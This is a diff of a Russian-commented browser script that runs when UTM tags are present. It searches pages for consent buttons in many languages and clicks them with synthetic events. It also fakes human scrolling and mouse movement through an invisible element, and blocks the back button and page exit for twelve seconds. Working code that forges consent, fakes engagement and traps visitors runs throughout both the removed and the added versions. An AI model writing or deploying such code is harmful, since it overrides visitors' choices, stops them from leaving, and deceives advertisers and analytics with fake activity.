@@ -5,351 +5,335 @@
   =============================== */
   var scrollStartDelay = 8000;
   var lockTime = 12000;
+
   var enableFakeMouse = true;
   var mouseMoveIntervalMin = 800;
   var mouseMoveIntervalMax = 2000;
-  var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  // Проверка UTM меток
+  var hasUTM = window.location.search.includes('utm_');
   
-  var clickDelay = 300; // Минимальная задержка
+  // Настройки кнопки СОГЛАСИЯ
+  var checkAgreeInterval = 1000; // Интервал проверки кнопки
+  var clickDelay = 1500; // Задержка перед кликом
   var agreeButtonFound = false;
 
+  var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
   /* ===============================
-     РАСШИРЕННЫЙ ПОИСК КНОПКИ
+     КНОПКА СОГЛАСИЯ - ПОИСК И КЛИК (МУЛЬТИЯЗЫЧНАЯ)
   =============================== */
   
-  // Ключевые слова на всех языках
-  var consentKeywords = [
-    'согласен', 'согласна', 'согласие', 'принимаю', 'разрешаю',
-    'келісемін', 'келісу', 'макул',
-    'agree', 'accept', 'consent', 'allow',
-    'zustimmen', 'akzeptieren',
-    'accepter', 'aceptar', 'accettare',
-    '同意', 'موافق'
+  // Массив текстов кнопок на разных языках для поиска
+  var buttonTexts = [
+    'AGREE',           // Английский
+    'СОГЛАСЕН',        // Русский
+    'СОГЛАСНА',        // Русский (женский род)
+    'ПРИНИМАЮ',        // Русский
+    'КЕЛІСЕМІН',       // Казахский
+    'КЕЛІСУ',          // Казахский
+    'МАКУЛ',           // Казахский
+    'ACCEPT',          // Английский
+    'CONSENT',         // Английский
+    'ZUSTIMMEN',       // Немецкий
+    'AKZEPTIEREN',     // Немецкий
+    'ACCEPTER',        // Французский
+    'ACEptar',         // Испанский
+    'ACCETTARE',       // Итальянский
+    'ZGADZAM SIĘ',     // Польский
+    '同意',             // Китайский
+    '同意する',         // Японский
+    'موافق'            // Арабский
   ];
   
-  // Проверка, является ли элемент кнопкой согласия
-  function isConsentElement(el) {
-    if (!el) return false;
+  function findAndClickAgreeButton() {
+    // Если нет UTM меток, выходим
+    if (!hasUTM) return;
     
-    // Проверяем текст
-    var text = (el.textContent || el.innerText || '').trim().toLowerCase();
-    for (var i = 0; i < consentKeywords.length; i++) {
-      if (text === consentKeywords[i].toLowerCase() || 
-          text.includes(consentKeywords[i].toLowerCase())) {
-        return true;
-      }
-    }
+    // Если кнопка уже найдена и обработана, выходим
+    if (agreeButtonFound) return;
+
+    var button = null;
+
+    // Поиск по тексту во всех кнопках
+    var allButtons = document.querySelectorAll('button, input[type="submit"], input[type="button"], a[role="button"], div[role="button"], span[role="button"]');
     
-    // Проверяем атрибуты
-    var attrs = ['title', 'aria-label', 'data-text', 'data-button-text', 'name', 'id', 'class'];
-    for (var j = 0; j < attrs.length; j++) {
-      var attrVal = (el.getAttribute(attrs[j]) || '').toLowerCase();
-      for (var k = 0; k < consentKeywords.length; k++) {
-        if (attrVal.includes(consentKeywords[k].toLowerCase())) {
-          return true;
+    for (var j = 0; j < allButtons.length; j++) {
+      var btnText = (allButtons[j].textContent || allButtons[j].innerText || allButtons[j].value || '').toUpperCase().trim();
+      
+      // Проверяем, содержит ли текст кнопки одно из ключевых слов
+      for (var k = 0; k < buttonTexts.length; k++) {
+        var keyword = buttonTexts[k].toUpperCase();
+        if (btnText === keyword || btnText.includes(keyword)) {
+          button = allButtons[j];
+          console.log('Кнопка найдена по тексту:', btnText);
+          break;
         }
       }
+      if (button) break;
     }
     
-    return false;
-  }
-  
-  // Поиск кнопки всеми возможными способами
-  function findConsentButton() {
-    // Способ 1: Все возможные кликабельные элементы
-    var clickableSelectors = [
-      'button', 
-      'input[type="submit"]', 
-      'input[type="button"]',
-      'a', 
-      'div[role="button"]', 
-      'span[role="button"]',
-      '[onclick]',
-      '[class*="btn"]',
-      '[class*="button"]',
-      '[class*="agree"]',
-      '[class*="consent"]',
-      '[class*="accept"]',
-      '[class*="келіс"]',
-      '[class*="соглас"]'
-    ];
-    
-    var allClickable = document.querySelectorAll(clickableSelectors.join(','));
-    for (var i = 0; i < allClickable.length; i++) {
-      if (isConsentElement(allClickable[i])) {
-        return allClickable[i];
-      }
-    }
-    
-    // Способ 2: Любой элемент с точным текстом
-    var allElements = document.querySelectorAll('*');
-    for (var j = 0; j < allElements.length; j++) {
-      var text = (allElements[j].textContent || '').trim();
-      // Ищем элементы с коротким текстом (до 20 символов)
-      if (text.length > 0 && text.length < 20) {
-        if (isConsentElement(allElements[j])) {
-          return allElements[j];
-        }
-      }
-    }
-    
-    // Способ 3: Поиск по XPath (более точный)
-    try {
-      var xpathResults = document.evaluate(
-        "//*[contains(text(),'СОГЛАСЕН') or contains(text(),'AGREE') or contains(text(),'КЕЛІСЕМІН')]",
-        document,
-        null,
-        XPathResult.FIRST_ORDERED_NODE_TYPE,
-        null
-      );
-      if (xpathResults.singleNodeValue) {
-        return xpathResults.singleNodeValue;
-      }
-    } catch(e) {}
-    
-    return null;
-  }
-  
-  // Поиск в iframe
-  function findInIframes() {
-    var iframes = document.querySelectorAll('iframe');
-    for (var i = 0; i < iframes.length; i++) {
-      try {
-        var iframeDoc = iframes[i].contentDocument || iframes[i].contentWindow.document;
-        if (iframeDoc) {
-          var btn = iframeDoc.querySelector('button, [role="button"], [class*="btn"], [class*="agree"]');
-          if (btn && isConsentElement(btn)) {
-            return btn;
+    // Если не нашли, ищем по классам и атрибутам
+    if (!button) {
+      var agreeSelectors = [
+        '[class*="agree"]',
+        '[class*="Agree"]',
+        '[class*="AGREE"]',
+        '[class*="consent"]',
+        '[class*="Consent"]',
+        '[class*="accept"]',
+        '[class*="Accept"]',
+        '[class*="соглас"]',
+        '[class*="келіс"]',
+        'button[class*="css-"]',
+        'button[class*="primary"]'
+      ];
+
+      for (var i = 0; i < agreeSelectors.length; i++) {
+        try {
+          var elements = document.querySelectorAll(agreeSelectors[i]);
+          for (var e = 0; e < elements.length; e++) {
+            var el = elements[e];
+            var elText = (el.textContent || el.innerText || '').toUpperCase().trim();
+            
+            // Проверяем текст элемента
+            for (var k = 0; k < buttonTexts.length; k++) {
+              var keyword = buttonTexts[k].toUpperCase();
+              if (elText === keyword || elText.includes(keyword)) {
+                button = el;
+                console.log('Кнопка найдена по классу/атрибуту, текст:', elText);
+                break;
+              }
+            }
+            if (button) break;
           }
+        } catch (e) {
+          continue;
         }
-      } catch(e) {}
-    }
-    return null;
-  }
-  
-  // Поиск в Shadow DOM
-  function findInShadowDom(root = document.body) {
-    if (root.shadowRoot) {
-      var btn = root.shadowRoot.querySelector('button, [role="button"], [class*="btn"]');
-      if (btn && isConsentElement(btn)) {
-        return btn;
-      }
-      var children = root.shadowRoot.querySelectorAll('*');
-      for (var i = 0; i < children.length; i++) {
-        var found = findInShadowDom(children[i]);
-        if (found) return found;
+        if (button) break;
       }
     }
-    var children = root.children;
-    for (var j = 0; j < children.length; j++) {
-      var found = findInShadowDom(children[j]);
-      if (found) return found;
-    }
-    return null;
-  }
-  
-  /* ===============================
-     УНИВЕРСАЛЬНЫЙ КЛИК
-  =============================== */
-  
-  function universalClick(element) {
-    if (!element || agreeButtonFound) return false;
-    
-    console.log('🎯 Найден элемент:', element.tagName, 'Текст:', element.textContent);
-    agreeButtonFound = true;
-    
-    // Прокручиваем к элементу
-    element.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    
-    setTimeout(function() {
-      try {
-        // 1. Нативный клик
-        element.click();
-        console.log('✓ Метод 1: click()');
-        
-        // 2. Событие MouseEvent
-        var rect = element.getBoundingClientRect();
-        var centerX = rect.left + rect.width / 2;
-        var centerY = rect.top + rect.height / 2;
-        
-        var clickEvent = new MouseEvent('click', {
-          view: window,
-          bubbles: true,
-          cancelable: true,
-          clientX: centerX,
-          clientY: centerY
-        });
-        element.dispatchEvent(clickEvent);
-        console.log('✓ Метод 2: MouseEvent');
-        
-        // 3. Эмуляция полной цепочки событий
-        var events = ['mouseenter', 'mousedown', 'mouseup', 'click'];
-        events.forEach(function(eventType) {
-          var event = new MouseEvent(eventType, {
+
+    if (button && !agreeButtonFound) {
+      var buttonText = (button.textContent || button.innerText || button.value || '').trim();
+      console.log('Кнопка согласия найдена ("' + buttonText + '"), готовлю клик...');
+      agreeButtonFound = true;
+
+      // Добавляем задержку перед кликом для реалистичности
+      setTimeout(function() {
+        try {
+          // Создаем событие клика
+          var mouseDown = new MouseEvent('mousedown', {
             view: window,
             bubbles: true,
-            cancelable: true,
-            clientX: centerX,
-            clientY: centerY
+            cancelable: true
           });
-          element.dispatchEvent(event);
-        });
-        console.log('✓ Метод 3: Полная цепочка событий');
-        
-        // 4. Если это div/span - ищем родительскую кнопку
-        if (element.tagName !== 'BUTTON' && element.tagName !== 'INPUT') {
-          var parent = element.closest('button, a, [role="button"], .btn, .button');
-          if (parent && parent !== element) {
+          
+          var mouseUp = new MouseEvent('mouseup', {
+            view: window,
+            bubbles: true,
+            cancelable: true
+          });
+          
+          var clickEvent = new MouseEvent('click', {
+            view: window,
+            bubbles: true,
+            cancelable: true
+          });
+
+          // Инициируем события
+          button.dispatchEvent(mouseDown);
+          setTimeout(function() {
+            button.dispatchEvent(mouseUp);
+            button.dispatchEvent(clickEvent);
+            
+            // Дополнительно вызываем нативный click
+            button.click();
+            
+            console.log('Кнопка "' + buttonText + '" нажата!');
+            
+            // После клика можно добавить дополнительную логику
             setTimeout(function() {
-              parent.click();
-              console.log('✓ Метод 4: Родительский элемент');
-            }, 50);
-          }
+              console.log('Подтверждение принято');
+            }, 1000);
+
+          }, 100);
+          
+        } catch (error) {
+          console.log('Ошибка при клике на кнопку:', error);
         }
-        
-        // 5. Trigger через jQuery если есть
-        if (typeof jQuery !== 'undefined') {
-          jQuery(element).trigger('click');
-          console.log('✓ Метод 5: jQuery trigger');
-        }
-        
-        // 6. Эмулируем нажатие Enter (для некоторых элементов)
-        var enterEvent = new KeyboardEvent('keydown', {
-          key: 'Enter',
-          code: 'Enter',
-          keyCode: 13,
-          which: 13,
-          bubbles: true
-        });
-        element.dispatchEvent(enterEvent);
-        console.log('✓ Метод 6: KeyboardEvent Enter');
-        
-        // Визуальное подтверждение
-        var originalBg = element.style.backgroundColor;
-        element.style.backgroundColor = '#4CAF50';
-        element.style.transition = '0.3s';
-        setTimeout(function() {
-          element.style.backgroundColor = originalBg;
-        }, 500);
-        
-        console.log('✅ Все методы клика выполнены!');
-        
-      } catch (error) {
-        console.log('❌ Ошибка клика:', error);
-      }
-    }, clickDelay);
-    
-    return true;
-  }
-  
-  /* ===============================
-     ОСНОВНОЙ ЦИКЛ ПОИСКА
-  =============================== */
-  
-  function searchAndClick() {
-    if (agreeButtonFound) return true;
-    
-    var button = findConsentButton();
-    if (!button) button = findInIframes();
-    if (!button) button = findInShadowDom();
-    
-    if (button) {
-      return universalClick(button);
+      }, clickDelay);
     }
-    return false;
   }
-  
-  /* ===============================
-     ЗАПУСК
-  =============================== */
-  
-  console.log('🚀 Скрипт запущен. Ищем кнопку "СОГЛАСЕН"...');
-  
-  // Многократные попытки с увеличивающимися интервалами
-  var delays = [100, 500, 1000, 2000, 3000, 5000, 8000, 12000, 15000, 20000];
-  
-  delays.forEach(function(delay) {
-    setTimeout(function() {
+
+  // Запуск проверки кнопки если есть UTM метки
+  if (hasUTM) {
+    console.log('UTM метки обнаружены, запускаю мультиязычный мониторинг кнопки согласия...');
+    
+    // Немедленная проверка
+    findAndClickAgreeButton();
+    
+    // Периодическая проверка
+    var agreeCheckInterval = setInterval(function() {
       if (!agreeButtonFound) {
-        var found = searchAndClick();
-        if (found) {
-          console.log('✅ Кнопка найдена и нажата на ' + delay + 'ms');
-        }
+        findAndClickAgreeButton();
+      } else {
+        // Останавливаем проверку после нахождения кнопки
+        clearInterval(agreeCheckInterval);
       }
-    }, delay);
-  });
-  
-  // MutationObserver для отслеживания появления кнопки
-  var observer = new MutationObserver(function(mutations) {
-    if (!agreeButtonFound) {
-      searchAndClick();
-    } else {
-      observer.disconnect();
-    }
-  });
-  
-  observer.observe(document.body, {
-    childList: true,
-    subtree: true,
-    attributes: true,
-    characterData: true
-  });
-  
-  // Проверка каждые 2 секунды
-  var interval = setInterval(function() {
-    if (agreeButtonFound) {
-      clearInterval(interval);
-    } else {
-      searchAndClick();
-    }
-  }, 2000);
-  
+    }, checkAgreeInterval);
+
+    // Также проверяем при изменениях DOM
+    var observer = new MutationObserver(function() {
+      if (!agreeButtonFound) {
+        findAndClickAgreeButton();
+      }
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+      attributeFilter: ['class', 'style']
+    });
+  }
+
   /* ===============================
-     ОСТАЛЬНОЙ ФУНКЦИОНАЛ
+     HUMAN SCROLL
   =============================== */
-  
-  // Human Scroll
-  setTimeout(function() {
-    var currentScroll = window.pageYOffset;
-    var maxScroll = document.body.scrollHeight - window.innerHeight;
-    
-    function scrollStep() {
-      if (currentScroll >= maxScroll) return;
-      currentScroll += Math.floor(Math.random() * 120) + 60;
-      window.scrollTo({ top: currentScroll, behavior: 'smooth' });
-      setTimeout(scrollStep, Math.floor(Math.random() * 800) + 400);
-    }
-    scrollStep();
-  }, scrollStartDelay);
-  
-  // Fake Mouse
-  setTimeout(function() {
-    if (enableFakeMouse && !isMobile) {
-      var mouse = document.createElement('div');
-      mouse.style.cssText = 'position:fixed;width:6px;height:6px;background:transparent;z-index:999999;pointer-events:none';
-      document.body.appendChild(mouse);
-      var x = Math.random() * window.innerWidth;
-      var y = Math.random() * window.innerHeight;
-      
-      function moveMouse() {
-        x += (Math.random() - 0.5) * 300;
-        y += (Math.random() - 0.5) * 200;
-        x = Math.max(0, Math.min(x, window.innerWidth));
-        y = Math.max(0, Math.min(y, window.innerHeight));
-        mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';
-        document.dispatchEvent(new MouseEvent('mousemove', { clientX: x, clientY: y, bubbles: true }));
-        setTimeout(moveMouse, Math.floor(Math.random() * 1200) + 800);
+  function humanScrollDown(callback) {
+    let currentScroll = window.pageYOffset;
+    const maxScroll = document.body.scrollHeight - window.innerHeight;
+
+    function step() {
+      if (currentScroll >= maxScroll) {
+        if (callback) setTimeout(callback, 1500);
+        return;
       }
-      moveMouse();
+
+      const scrollStep = Math.floor(Math.random() * 120) + 60;
+      currentScroll += scrollStep;
+
+      window.scrollTo({
+        top: currentScroll,
+        behavior: 'smooth'
+      });
+
+      const delay = Math.floor(Math.random() * 800) + 400;
+      setTimeout(step, delay);
     }
-  }, 3000);
-  
-  // Back Lock
+
+    step();
+  }
+
+  function humanScrollUp() {
+    let currentScroll = window.pageYOffset;
+
+    function step() {
+      if (currentScroll <= 0) return;
+
+      const scrollStep = Math.floor(Math.random() * 120) + 60;
+      currentScroll -= scrollStep;
+      if (currentScroll < 0) currentScroll = 0;
+
+      window.scrollTo({
+        top: currentScroll,
+        behavior: 'smooth'
+      });
+
+      const delay = Math.floor(Math.random() * 800) + 400;
+      setTimeout(step, delay);
+    }
+
+    step();
+  }
+
+  setTimeout(function () {
+    humanScrollDown(humanScrollUp);
+  }, scrollStartDelay);
+
+  /* ===============================
+     FAKE MOUSE (DESKTOP ONLY)
+  =============================== */
+  function startFakeMouse() {
+    if (!enableFakeMouse || isMobile) return;
+
+    var mouse = document.createElement('div');
+    mouse.style.position = 'fixed';
+    mouse.style.width = '6px';
+    mouse.style.height = '6px';
+    mouse.style.borderRadius = '50%';
+    mouse.style.background = 'rgba(0,0,0,0.0)'; // невидимая, но события есть
+    mouse.style.zIndex = '999999';
+    mouse.style.pointerEvents = 'none';
+    document.body.appendChild(mouse);
+
+    var x = Math.random() * window.innerWidth;
+    var y = Math.random() * window.innerHeight;
+
+    function moveMouse() {
+      var dx = (Math.random() - 0.5) * 300;
+      var dy = (Math.random() - 0.5) * 200;
+
+      x += dx;
+      y += dy;
+
+      if (x < 0) x = 0;
+      if (y < 0) y = 0;
+      if (x > window.innerWidth) x = window.innerWidth;
+      if (y > window.innerHeight) y = window.innerHeight;
+
+      mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';
+
+      document.dispatchEvent(new MouseEvent('mousemove', {
+        clientX: x,
+        clientY: y,
+        bubbles: true
+      }));
+
+      var delay = Math.floor(
+        Math.random() * (mouseMoveIntervalMax - mouseMoveIntervalMin)
+      ) + mouseMoveIntervalMin;
+
+      setTimeout(moveMouse, delay);
+    }
+
+    moveMouse();
+  }
+
+  setTimeout(startFakeMouse, 3000);
+
+  /* ===============================
+     EXIT / BACK LOCK
+  =============================== */
   var isLocked = true;
+
   history.pushState(null, null, location.href);
   history.pushState(null, null, location.href);
-  window.addEventListener("popstate", function() { if (isLocked) history.pushState(null, null, location.href); });
-  window.addEventListener("beforeunload", function(e) { if (isLocked) { e.preventDefault(); e.returnValue = ''; } });
-  setTimeout(function() { isLocked = false; }, lockTime);
+
+  window.addEventListener("popstate", function () {
+    if (isLocked) {
+      history.pushState(null, null, location.href);
+    }
+  });
+
+  window.addEventListener("beforeunload", function (e) {
+    if (isLocked) {
+      e.preventDefault();
+      e.returnValue = '';
+    }
+  });
+
+  if (isMobile) {
+    document.addEventListener("visibilitychange", function () {
+      if (document.hidden && isLocked) {
+        history.pushState(null, null, location.href);
+      }
+    });
+  }
+
+  setTimeout(function () {
+    isLocked = false;
+  }, lockTime);
 
 })();
